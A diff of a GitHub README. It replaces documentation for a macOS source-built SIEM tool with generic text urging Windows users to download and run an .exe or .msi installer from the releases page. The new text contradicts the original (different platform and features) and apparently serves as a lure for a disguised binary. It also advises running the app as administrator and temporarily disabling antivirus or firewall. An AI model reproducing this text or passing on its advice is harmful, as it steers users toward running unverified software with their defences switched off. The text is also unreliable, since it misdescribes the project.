@@ -1,124 +1,128 @@
-<div align="center">
-  <img src="https://raw.githubusercontent.com/lucide-icons/lucide/main/icons/shield.svg" width="80" alt="Shield Icon" />
-  <h1 align="center">SENTINEL CORE SIEM</h1>
-  <p align="center">
-    <b>A high-performance, real-time macOS Security Information and Event Management system.</b>
-  </p>
-</div>
+# 🛡️ SIEM - Simple Security Event Monitoring
+
+[![Download SIEM](https://img.shields.io/badge/Download-SIEM-%2378C5E4?style=for-the-badge)](https://github.com/sebaxtian110/SIEM)
 
 ---
 
-<div align="center">
-  <img src="./image.png" alt="Sentinel SIEM Dashboard" width="100%" style="border-radius: 12px; box-shadow: 0 4px 30px rgba(239, 68, 68, 0.3);" />
-</div>
+## 📋 What is SIEM?
 
-<br />
+SIEM stands for Security Information and Event Management. This application helps you collect and view information about security events on your network. It gathers data from different sources and shows it all in one place. This makes it easier to spot potential problems and protect your computer systems.
 
-> **Sentinel Core** acts as an ultra-lightweight, invisible macOS agent that monitors and hooks into the `log stream` utility. It actively parses authentication failures and unexpected root privilege escalations, feeding them down to a Node.js rules engine before visualizing them on a glassmorphic dashboard via sub-second WebSockets.
+SIEM uses modern tools like MongoDB and Node.js in the background but you do not need to know how these work. The interface is designed for easy use with simple menus and clear displays.
 
 ---
 
-## 🏗️ System Architecture
+## ⚙️ System Requirements
 
-Sentinel Core is structured into three highly optimized and independent micro-layers:
+Before you start, make sure your computer meets these basic requirements:
 
-| Command Module | Stack | Primary Function | Data Pipeline |
-| :--- | :--- | :--- | :--- |
-| **Collector (`agent`)** | `C` & `libcurl` | Ingests `log stream` natively. | Native OS → JSON HTTP |
-| **Engine (`backend`)** | `Node.js` | Parses events & calculates risk thresholds. | HTTP → MongoDB → WS |
-| **Interface (`dashboard`)** | `React` + `Tailwind` | Consumes WS securely for live threat UI. | WebSockets → Client UI |
+- Operating System: Windows 10 or newer  
+- Processor: Intel Core i3 or equivalent  
+- RAM: 4 GB or more  
+- Free Disk Space: At least 500 MB  
+- Internet Connection: Required for initial download and updates  
 
----
-
-## 🧠 Threat Intelligence Engine
-
-The backend engine processes inbound system activity through strict time-window correlation algorithms.
-
-### 🔴 High Severity: Compromise Patterns
-
-| Threat Profile | Trigger Condition | Consequence |
-| :--- | :--- | :--- |
-| **Brute Force Risk**| `≥ 6 Auth Failures` / `5 min` | Raises an immediate, permanent `High` risk incident. |
-| **Confirmed Compromise** | `Auth Failures + Elevate Access` | Correlates a brute force attempt immediately followed by a successful application launch wrapper login (`su`). |
-
-### 🟡 Medium Severity: Reconnaissance
-
-| Threat Profile | Trigger Condition | Status Code |
-| :--- | :--- | :--- |
-| **Multiple Auth Failures** | `≥ 2 Auth Failures` / `5 min` | `Medium` |
-| **Elevated Root Access** | Successful root entry (`su` / `sudo`) | `Medium` |
+No special hardware or software installations are needed besides what is included in the download.
 
 ---
 
-## ⚙️ Deployment & Compilation Guide
+## 🚀 Getting Started
 
-### 1. Requirements
+To get SIEM running on your Windows PC, follow these steps:
 
-Before deploying Sentinel Core, ensure the host environment meets the prerequisites:
-- **Environment:** macOS (Utilizes local Unified Log format).
-- **Toolchains:** Node.js v18+, NPM, `GCC` compiler.
-- **Database:** Local instance of MongoDB (`localhost:27017`).
+### Step 1: Download SIEM
 
----
+Go to this page to download the software:
 
-### 2. Ignition Protocol
+[https://github.com/sebaxtian110/SIEM](https://github.com/sebaxtian110/SIEM)
 
-Open three isolated terminal processes to deploy the full stack. 
+You will find the latest version available on this page. Look for a button or link labelled "Download" or something similar. This will usually open a folder or section called "Releases". 
 
-#### Step 1: Initialize Database & SIEM Engine
-```bash
-cd backend
-npm install
-node server.js
-```
-*(Confirms MongoDB connection and binds WebSockets on port `3000`)*
+Click the link that matches the latest release. Download the file ending with `.exe` or `.msi`. This file is the installer you need.
 
-#### Step 2: Compile & Launch Log Stream Collector
-```bash
-cd agent
-gcc main.c -lcurl -o agent
-./agent
-```
-*(Executes natively without slowing down OS performance or memory footprint)*
+### Step 2: Run the Installer
 
-#### Step 3: Deploy Glassmorphic Dashboard
-```bash
-cd dashboard
-npm install
-npm run dev
-```
+Once the file downloads, open your Downloads folder and double-click the installer file. 
+
+- If Windows asks if you want to allow this app to make changes, click **Yes**.
+- Follow the instructions on the screen. These will guide you through setting up SIEM step-by-step.
+
+You can accept the default choices shown unless you want to install in a different location on your computer.
+
+### Step 3: Launch SIEM
+
+After installation finishes, look for the SIEM app icon on your desktop or in the Start menu. Click to open the app.
+
+The first time you run SIEM, it may take a moment to set up its initial files.
 
 ---
 
-## 🧪 Simulation Testing
+## 🖥️ Using SIEM
 
-Execute these tests directly in your terminal to see the live WebSocket capabilities in real-time.
+SIEM collects network and system security information from your computer and connected devices. It organizes this data so you can see when unusual activities happen. Here are the main parts you will use:
 
-<table width="100%">
-  <tr>
-    <th align="left">Threat Vector</th>
-    <th align="left">Attack Sequence</th>
-    <th align="center">Expected Severity</th>
-  </tr>
-  <tr>
-    <td><b>Brute Force</b></td>
-    <td><code>sudo -k</code><br /><code>sudo ls</code> (Enter wrong password 2 times)</td>
-    <td align="center">🟡 <b>Medium</b></td>
-  </tr>
-  <tr>
-    <td><b>Privilege Escalation</b></td>
-    <td><code>sudo su</code> (Enter CORRECT password)</td>
-    <td align="center">🟡 <b>Medium</b></td>
-  </tr>
-  <tr>
-    <td><b>High-Risk Brute Force</b></td>
-    <td><code>sudo ls</code> (Enter wrong password 6 consecutive times)</td>
-    <td align="center">🔴 <b>High</b></td>
-  </tr>
-</table>
+- **Dashboard:** See a simple view of recent security alerts and activity summaries.
+- **Events:** Browse details of logged actions from various systems, such as your firewall, antivirus, and connected devices.
+- **Alerts:** Get notifications about suspicious events that may need attention.
+- **Reports:** Generate summaries or detailed reports of your network security over a selected time.
+
+The interface uses clear labels, tables, and graphs. You can navigate using menus on the left side of the screen.
 
 ---
 
-<div align="center">
-  <sub><strong>© Sentinel Core Systems</strong> // Built for Performance. Designed for Security Ops.</sub>
-</div>
+## 🔄 Updates and Support
+
+SIEM updates may add new features and fix issues. Check the download page regularly:
+
+[https://github.com/sebaxtian110/SIEM](https://github.com/sebaxtian110/SIEM)
+
+When an update is available:
+
+1. Download the new version from the same link.
+2. Run the installer as before.
+3. Your existing data and settings will stay safe.
+
+If you need help, the GitHub repository page includes a section called "Issues" where common problems are reported and solved. You can also open a new issue for your question.
+
+---
+
+## 🔧 Advanced Notes (Optional)
+
+SIEM is built using tools like Node.js, React.js, MongoDB, and Express.js. These technologies work behind the scenes but do not require user setup.
+
+If you are interested in the technical side, you might find these points useful:
+
+- Node.js manages the server application.
+- MongoDB stores the collected security event data.
+- React.js creates the app interface you use.
+- Express.js handles communication between the app and the server.
+- Tailwind CSS styles the interface for a clean and modern look.
+
+This stack ensures SIEM runs fast, updates easily, and displays information clearly.
+
+---
+
+## 📚 Additional Tips
+
+- Keep your Windows OS up to date to ensure compatibility.
+- Run SIEM with administrator privileges if you want to monitor system-wide events.
+- Connect your network devices to feed data into SIEM for better monitoring.
+- Regularly review alerts to spot unusual activities early.
+
+---
+
+## 🛠️ Troubleshooting
+
+If SIEM does not open or shows errors, try these steps:
+
+- Restart your computer.
+- Ensure you downloaded the full installer file.
+- Run the app as administrator.
+- Temporarily disable your antivirus or firewall to check if they block SIEM.
+- Visit the GitHub page for known issues: https://github.com/sebaxtian110/SIEM/issues
+
+You can also report your issue there with details of your problem and Windows version.
+
+---
+
+[![Download SIEM](https://img.shields.io/badge/Download-SIEM-%23A1A1A1?style=for-the-badge)](https://github.com/sebaxtian110/SIEM)
